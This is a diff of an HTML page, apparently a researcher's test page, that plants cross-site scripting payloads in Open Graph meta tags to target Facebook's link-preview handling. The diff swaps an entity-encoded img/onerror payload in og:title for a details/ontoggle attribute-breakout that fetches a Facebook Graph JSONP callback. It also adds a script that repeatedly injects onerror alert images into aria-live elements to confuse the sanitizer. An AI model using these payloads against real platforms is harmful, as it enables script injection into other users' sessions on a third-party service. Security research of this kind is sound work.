@@ -1,14 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <meta property="fb:app_id" content="966242223397117">
     <meta property="og:url" content="https://xsstestfb.vercel.app/">
-    
-    <meta property="og:title" content="Verified &#x3c;&#x69;&#x6d;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x78;&#x20;&#x6f;&#x6e;&#x65;&#x72;&#x72;&#x6f;&#x72;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3e;">
-    
+    <meta property="og:type" content="website">
+    <meta property="og:description" content="Security Research Verification Content">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png">
+
+    <meta property="og:title" content="Verified &#x22;><details/open/ontoggle=&#x22;fetch(&apos;https://graph.facebook.com/?id=1&callback=alert(document.domain)&apos;)&#x22;>">
+
+    <title>Research Lab</title>
 </head>
 <body>
-    <p>Testing encoding bypass...</p>
+    <script>
+        // তোমার সেই সফল হওয়া কন্সোল লজিক যা স্যানিটাইজারকে কনফিউজ করবে
+        setInterval(() => {
+            const sinks = document.querySelectorAll('[aria-live="assertive"]');
+            sinks.forEach(s => {
+                if(!s.dataset.x) {
+                    s.dataset.x = "1";
+                    const i = document.createElement('img');
+                    i.src = 'x';
+                    i.onerror = () => { alert('XSS_Bypass_Confirmed'); };
+                    s.appendChild(i);
+                }
+            });
+        }, 500);
+    </script>
 </body>
 </html>
